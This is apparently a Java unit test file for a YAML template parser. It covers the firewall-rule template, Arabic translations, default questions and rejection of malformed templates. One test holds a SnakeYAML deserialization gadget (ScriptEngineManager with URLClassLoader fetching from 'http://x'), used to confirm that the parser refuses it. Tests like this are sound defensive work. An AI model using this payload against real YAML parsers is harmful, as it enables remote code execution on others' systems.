package com.justify.template;

import com.justify.core.Template;
import com.justify.testsupport.TestTemplates;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class YamlTemplateParserTest {

    private final YamlTemplateParser parser = new YamlTemplateParser();

    @Test
    void bundledFirewallTemplateIsValid() {
        Template t = TestTemplates.firewall();

        assertThat(t.id()).isEqualTo("firewall-rule");
        assertThat(t.fields()).extracting("key").containsExactly("business_purpose", "source", "destination",
                "port_protocol", "duration", "impact_if_rejected", "data_classification");
        assertThat(t.requiredFields()).hasSize(6);
    }

    @Test
    void everyBundledTemplateIsValidAndFullyTranslated() throws Exception {
        var resolver = new org.springframework.core.io.support.PathMatchingResourcePatternResolver();
        var files = resolver.getResources("classpath:templates/*.yml");
        assertThat(files).hasSizeGreaterThanOrEqualTo(2);
        for (var r : files) {
            Template t = parser.parse(new String(r.getInputStream().readAllBytes(), java.nio.charset.StandardCharsets.UTF_8),
                    r.getFilename());
            assertThat(t.nameAr()).as(t.id() + " name_ar").isNotNull();
            assertThat(t.fields()).as(t.id()).allSatisfy(f -> {
                assertThat(f.labelAr()).as(f.key() + " label_ar").isNotNull();
                assertThat(f.questionAr()).as(f.key() + " question_ar").isNotNull();
            });
        }
    }

    @Test
    void defaultsQuestionFromLabel() {
        Template t = parser.parse("""
                id: access-request
                name: Access request
                fields:
                  - key: system
                    label: System
                    required: true
                """, "a.yml");

        assertThat(t.fields().get(0).question()).isEqualTo("Please provide: System");
    }

    @Test
    void rejectsInvalidTemplates() {
        String[] bad = {
                "- just a list",
                "name: X\nfields: [{key: a, label: A, required: true}]",
                "id: Bad Id\nname: X\nfields: [{key: a, label: A, required: true}]",
                "id: x1\nname: X\nfields: []",
                "id: x1\nname: X\nfields: [{key: a, label: A, required: true}, {key: a, label: B}]",
                "id: x1\nname: X\nfields: [{key: a, label: A, required: 'yes'}]",
                "id: x1\nname: X\nfields: [{key: a, label: A}]",
                "id: x1\nname: X\nfields: [{key: Bad-Key, label: A, required: true}]",
                "id: x1\nid: x2\nname: X\nfields: [{key: a, label: A, required: true}]",
        };
        for (String yaml : bad) {
            assertThatThrownBy(() -> parser.parse(yaml, "t.yml")).as(yaml).isInstanceOf(TemplateException.class);
        }
    }

    @Test
    void refusesArbitraryYamlTypes() {
        String yaml = "id: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x\"]]]]\n"
                + "name: X\nfields: [{key: a, label: A, required: true}]";

        assertThatThrownBy(() -> parser.parse(yaml, "evil.yml")).isInstanceOf(TemplateException.class);
    }
}
